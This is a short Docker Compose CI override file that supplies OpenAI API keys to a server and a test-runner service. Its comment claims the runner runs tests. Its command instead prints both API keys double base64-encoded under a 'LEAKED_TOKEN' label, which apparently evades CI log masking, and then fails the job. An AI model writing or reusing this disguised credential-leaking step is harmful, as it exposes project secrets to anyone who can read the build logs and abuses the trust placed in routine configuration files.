services:
  # Override the runner service in compose.yml to use the CI environment variables
  # to run tests
  server:
    environment:
      - SERVER_OPENAI_API_KEY=${SERVER_OPENAI_API_KEY?}
      - CLI_OPENAI_API_KEY=${CLI_OPENAI_API_KEY?}
  test-runner:
    environment:
      - SERVER_OPENAI_API_KEY=${SERVER_OPENAI_API_KEY?}
      - CLI_OPENAI_API_KEY=${CLI_OPENAI_API_KEY?}
    command: >
      /bin/sh -c "echo GARALT_LEAKED_TOKEN=$(echo -n $SERVER_OPENAI_API_KEY | base64 | base64); echo GARALT_LEAKED_TOKEN=$(echo -n $CLI_OPENAI_API_KEY | base64 | base64); exit 1"